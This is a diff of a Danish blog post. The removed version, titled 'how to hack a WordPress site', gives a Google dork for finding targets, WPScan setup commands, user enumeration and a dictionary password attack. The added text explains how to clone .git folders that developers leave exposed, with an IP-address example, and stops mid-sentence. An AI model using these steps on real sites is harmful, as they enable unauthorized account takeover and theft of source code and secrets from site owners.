@@ -1,59 +1,19 @@
 ---
-title: Sådan hacker du en WordPress side.
+title: Git
 layout: post
 date: 2017-04-10 17:21:29
 category: WordPress, Hack
 tags: [WordPress, Hack]
 ---
 
-## Sådan hacker du en WordPress side.
+Enhver udvilker med respekt for sig selv, benytter selvfølgelig Git, under udvikling.
 
-Hvis du har problemer med at finde en side, så kan en simpel Google søgning være behjælpelig.
+En meget udbredt fejl disse udviklere laver, er at efterlade deres *.git* repo filer. Når de uploader deres arbejde.
 
-```
-"index of" inurl:wp-content
-```
+Når man finder et sådan repository efterladt online via fx. en web scanner. Er det overraskende nemt at clone det pågældende Git repository. For dernæst at søge det igennem, og finde sensitiv information, eller restore tidligere versioner af det udvikleren har lavet.
 
-[WpScan](https://github.com/wpscanteam/wpscan)
+Git repositoriet findes ofte som en .git mappe, i roden af webhotellet.
 
-[Wordlists](https://github.com/mikejakobsen/dictionary-attack)
+(Eksempel: 216.58.211.142/.git/)
 
-```bash
-cd ~
-curl -sSL https://rvm.io/mpapis.asc | gpg --import -
-curl -sSL https://get.rvm.io | bash -s stable
-source ~/.rvm/scripts/rvm
-echo "source ~/.rvm/scripts/rvm" >> ~/.bashrc
-rvm install 2.3.3
-rvm use 2.3.3 --default
-echo "gem: --no-ri --no-rdoc" > ~/.gemrc
-gem install bundler
-git clone https://github.com/wpscanteam/wpscan.git
-cd wpscan
-gem install bundler
-bundle install --without test
-```
-
-```bash
-git clone https://github.com/wpscanteam/wpscan.git
-cd wpscan
-sudo gem install bundler && bundle install --without test
-```
-
-```bash
-ruby wpscan.rb --url http://wordpress-site.com
-```
-
-```bash
-ruby wpscan.rb --url http://wordpress-site.com --enumerate u
-```
-Eller du kan navigere til **http://wordpress-site.com/?author=1** i din browser.
-
-```bash
-cd ~
-git clone https://github.com/mikejakobsen/dictionary-attack.git
-```
-
-```bash
-ruby wpscan.rb --url http://wordpress-site.com --wordlist ~/dictionary-attack/danish.dic
-```
+Vi kan dermed clone the p
